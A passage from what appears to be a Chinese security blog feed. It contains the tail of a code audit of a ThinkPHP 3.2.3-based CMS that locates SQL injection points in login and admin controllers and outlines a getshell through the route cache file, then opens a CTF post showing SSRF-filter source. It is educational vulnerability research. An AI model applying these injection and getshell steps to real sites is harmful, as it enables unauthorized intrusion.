├─README.txt   框架README文件</span><br><span class="line">│  └─ThinkPHP.php 框架入口文件</span><br></pre></td></tr></table></figure><p>mvc架构的cms通常会有URL路由</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/14/5cda7d21ec51235190.png"                                        ></p><p> 例如我们访问<code>http://serverName/index.php/login</code></p><p>等同于访问<code>http://serverName/index.php/user/login/index</code></p><p>对应的controller类是：<code>application\User\Controller\IndexController.class.php</code></p><p>了解相应的路由规则可以有效的定位漏洞的触发点</p><h2 id="0x2-入口文件"><a href="#0x2-入口文件" class="headerlink" title="0x2 入口文件"></a>0x2 入口文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;magic_quotes_gpc&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripslashesRecursive</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$array</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$v</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$array</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$v</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$v</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$array</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">stripslashesRecursive</span>(<span class="variable">$v</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span> = <span class="title function_ invoke__">stripslashesRecursive</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_POST</span> = <span class="title function_ invoke__">stripslashesRecursive</span>(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;APP_DEBUG&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SITE_PATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(__file__) . <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>, SITE_PATH . <span class="string">&#x27;application/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SPAPP_PATH&#x27;</span>, SITE_PATH . <span class="string">&#x27;yxtedu/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SPAPP&#x27;</span>, <span class="string">&#x27;./application/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SPSTATIC&#x27;</span>, SITE_PATH . <span class="string">&#x27;statics/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;RUNTIME_PATH&quot;</span>, SITE_PATH . <span class="string">&quot;data/runtime/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;HTML_PATH&quot;</span>, SITE_PATH . <span class="string">&quot;data/runtime/Html/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;THINKCMF_CORE_TAGLIBS&quot;</span>, <span class="string">&#x27;cx,Common\Lib\Taglib\TagLibSpadmin,Common\Lib\Taglib\TagLibHome&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;data/install.lock&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>]) != <span class="string">&quot;install&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:./index.php?g=install&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span> SPAPP_PATH . <span class="string">&#x27;Core/ThinkPHP.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>line 2-21</code>判断了是否开启了<code>magic_quotes_gpc</code> ,如果开启了则会对<code>GET、POST</code>获得的数据进行处理。处理使用的函数就是<code>stripslashes</code>返回一个去除转义反斜线后的字符串（<code>\&#39;</code> 转换为 <code>&#39;</code> 等等）。双反斜线（<code>\\</code>）被转换为单个反斜线（<code>\</code>）。</p><p>此处感觉多此一举，如果是开启了<code>magic_quotes_gpc</code>,程序直接使用了</p><p><code>$_GET、$_POST</code>传输的数据则会存在安全问题。</p><p>下面的流程就是引入<code>ThinkPHP</code>的核心文件和判断是否已经安装</p><h2 id="0x3-审计"><a href="#0x3-审计" class="headerlink" title="0x3 审计"></a>0x3 审计</h2><p>因为此程序采用的mvc模式 所以 审计我们只要把重点放在controller这里即可</p><p>有些读者可能不知该如何寻找出漏洞，在拿到源码后感觉无从下手。</p><p>笔者在这里分享下自己的几个方法以供参考</p><ul><li>使用Seay源码审计根据特征扫描出来的位置进行跟进审计</li><li>通读整个源码的流程层层跟进审计（这种需要耗费大量时间，但时间与收益是对等的，遗漏的东西不多）</li><li>黑盒+白盒共同测试，根据前台或后台页面位置的功能，有选择的审计某个功能所对应的源码。例如：sql注入一般是需要有输入的地方，那么可以找登录模块、搜索模块、文章模块等等</li></ul><p>选择合适的方法可以为你接下来进行的工作提高效率。</p><h3 id="0x3-1-前台登录一处注入"><a href="#0x3-1-前台登录一处注入" class="headerlink" title="0x3.1 前台登录一处注入"></a>0x3.1 前台登录一处注入</h3><p><code>application\User\Controller\LoginController.class.php</code></p><p>LIne <code>116-140</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//登录验证</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">dologin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">sp_check_verify_code</span>())&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&quot;验证码错误！&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$users_model</span>=<span class="title function_ invoke__">M</span>(<span class="string">&quot;Users&quot;</span>);</span><br><span class="line">   <span class="variable">$rules</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="comment">//array(验证字段,验证规则,错误提示,验证条件,附加规则,验证时间)</span></span><br><span class="line">   <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;手机号/邮箱/用户名不能为空！&#x27;</span>, <span class="number">1</span> ),</span><br><span class="line">   <span class="keyword">array</span>(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;密码不能为空！&#x27;</span>,<span class="number">1</span>),</span><br><span class="line">   </span><br><span class="line">   );</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$users_model</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$rules</span>)-&gt;<span class="title function_ invoke__">create</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$users_model</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d+$/&#x27;</span>, <span class="variable">$username</span>))&#123;<span class="comment">//手机号登录</span></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_do_mobile_login</span>();</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_do_email_login</span>(); <span class="comment">// 用户名或者邮箱登录</span></span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol><li>首先验证了验证码是否正确（默认是没有开验证码功能的）</li><li>验证输入的内容是否满足 <code>$rules</code>的条件</li><li> 132行直接接收了 $_POST传入的<code>username</code></li><li>判断是以那种方式，手机号或者用户名登录的</li></ol><p>问题出在了</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/15/5cdc25cd3d56936762.jpg"                                        ></p><p>因为是直接接受的Post传过来的内容，在<code>Thinkphp 3.2.3</code>where处存在缺陷如果没有经过<code>I</code>函数接受数据则会导致SQL注入</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/15/5cdc25fb2e1e231781.jpg"                                        ></p><p>这个缺陷因为执行流程篇幅过长，分析会在后面的文章进行详细分析。</p><p><code>_do_mobile_login</code>这里也存在，两个一样的类型。</p><h3 id="0x3-2-后台广告编辑一处注入"><a href="#0x3-2-后台广告编辑一处注入" class="headerlink" title="0x3.2 后台广告编辑一处注入"></a>0x3.2 后台广告编辑一处注入</h3><p><code>application\Admin\Controller\AdController.class.php</code></p><p>Line <code>37-42</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">I</span>(<span class="string">&quot;get.id&quot;</span>);</span><br><span class="line"><span class="variable">$ad</span>=<span class="variable language_">$this</span>-&gt;ad_model-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ad_id=<span class="subst">$id</span>&quot;</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$ad</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>where</code>出直接拼接了参数，I函数默认使用的是<code>htmlspecialchars</code></p><p>并不会转义单引号所以这里存在了注入</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/15/5cdc29610f71760461.jpg"                                        ></p><h3 id="0x3-3-后台友情连接处注入"><a href="#0x3-3-后台友情连接处注入" class="headerlink" title="0x3.3 后台友情连接处注入"></a>0x3.3 后台友情连接处注入</h3><p><code>application\Admin\Controller\LinkController.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一处注入</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">I</span>(<span class="string">&quot;get.id&quot;</span>);<span class="comment">//下方使用了拼接字符</span></span><br><span class="line"><span class="variable">$link</span>=<span class="variable language_">$this</span>-&gt;link_model-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;link_id=<span class="subst">$id</span>&quot;</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$link</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;targets&quot;</span>,<span class="variable">$this</span>-&gt;targets);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ids&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;display&quot;</span>])&#123;</span><br><span class="line"><span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;ids&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;link_status&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;link_model-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;link_id in (<span class="subst">$ids</span>)&quot;</span>)-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>)!==<span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&quot;显示成功！&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&quot;显示失败！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ids&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;hide&quot;</span>])&#123;</span><br><span class="line"><span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;ids&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;link_status&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;link_model-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;link_id in (<span class="subst">$ids</span>)&quot;</span>)-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>)!==<span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&quot;隐藏成功！&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&quot;隐藏失败！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几处注入都是因为自己拼接了字符串 或者使用原生的<code>POST、GET</code>获得数据没有任何过滤引起的注入</p><p>这种注入在此程序中有多处就不再一一列举</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/16/5cdce4189f1cf33249.png"                                        ></p><h3 id="0x3-4-Getshell"><a href="#0x3-4-Getshell" class="headerlink" title="0x3.4 Getshell"></a>0x3.4 Getshell</h3><p>没有getshell的审计，怎么能满足各位呢:)</p><p><code>application\Admin\Controller\RouteController.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$routes</span>=<span class="variable language_">$this</span>-&gt;route_model-&gt;<span class="title function_ invoke__">order</span>(<span class="string">&quot;listorder asc&quot;</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line"><span class="title function_ invoke__">sp_get_routes</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&quot;routes&quot;</span>,<span class="variable">$routes</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先获取了数据库中route表内容的数据，跟进<code>sp_get_routes</code></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/16/5cdcf0e991dc278694.png"                                        ></p><p>先从数据库中取出<code>status</code>为1的路由规则，然后对取出来的路由数组进行<code>htmlspecialchars_decode</code>解码</p><p>在Line <code>1225-1227</code>处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">F</span>(<span class="string">&quot;routes&quot;</span>,<span class="variable">$cache_routes</span>);</span><br><span class="line"><span class="variable">$route_dir</span>=SITE_PATH.<span class="string">&quot;/data/conf/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$route_dir</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="variable">$route_dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$route_file</span>=<span class="variable">$route_dir</span>.<span class="string">&quot;route.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$route_file</span>, <span class="string">&quot;&lt;?php\treturn &quot;</span> . <span class="title function_ invoke__">stripslashes</span>(<span class="title function_ invoke__">var_export</span>(<span class="variable">$all_routes</span>, <span class="literal">true</span>)) . <span class="string">&quot;;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里判断了<code>/data/conf/</code>文件夹是否存在不存在会创建，接着往下看可以看到使用<code>file_put_contents</code>函数进行了文件操作。将从数据表获取的数据以键值的形式存进<code>route.php</code>。这里要注意的是<code>stripslashes</code></p><p>，如果没有这个函数的存在，数据中的<code>&#39;</code>会被<code>var_export</code>全部转义。</p><p>因为多了一个<code>stripslashes</code>去除转义符，那么getshell的思路就有了:</p><ol><li><p>首先在后台添加路由到数据库内，不必担心添加数据时是否会被过滤.</p></li><li><p>添加后转到路由规则设置的首页</p></li><li><p>首页执行index()将数据库里的内容写入route.php</p></li></ol><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/16/5cdcf439835ba37827.png"                                        ></p><p>保存后访问<code>route.php</code>看看是否成功</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/16/5cdcf495c648d29591.png"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/16/5cdcf4f493b4362562.png"                                        ></p><p>成功getshell</p><h2 id="0x4-篇外"><a href="#0x4-篇外" class="headerlink" title="0x4 篇外"></a>0x4 篇外</h2><p>代码审计需要有足够的耐心和细心，此处的getshell处，笔者也是找了很久才发现。</p><p>多多阅读各位前辈公开的代码审计案例，以及乌云1000php，可以学习到一些不错的思路。</p><p>笔者已经搭建了乌云1000php，在这里贴上地址：<a class="link"   href="http://php.evi1s.com/" >http://php.evi1s.com/<i class="fas fa-external-link-alt"></i></a></p><p>当然此程序还有其他的漏洞，例如变量覆盖，xss等这里笔者就留给各位学习代码审计的道友去自行审计学习了</p><p>如果内容有错误处，请联系笔者，避免带偏其他人。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-MVC简介&quot;&gt;&lt;a href=&quot;#0x0-MVC简介&quot; class=&quot;headerlink&quot; title=&quot;0x0 MVC简介&quot;&gt;&lt;/a&gt;0x0 MVC简介&lt;/h2&gt;&lt;p&gt;在审计代码之前我们先来了解下 什么是MVC。&lt;/p&gt;
&lt;p&gt;MVC模式代表 Mode</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>某CTF交流群入群WEB题</title>
    <link href="http://example.com/2019/03/25/%E6%9F%90CTF%E4%BA%A4%E6%B5%81%E7%BE%A4%E5%85%A5%E7%BE%A4WEB%E9%A2%98/"/>
    <id>http://example.com/2019/03/25/%E6%9F%90CTF%E4%BA%A4%E6%B5%81%E7%BE%A4%E5%85%A5%E7%BE%A4WEB%E9%A2%98/</id>
    <published>2019-03-25T11:00:39.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF交流群——WEB"><a href="#CTF交流群——WEB" class="headerlink" title="CTF交流群——WEB"></a>CTF交流群——WEB</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span 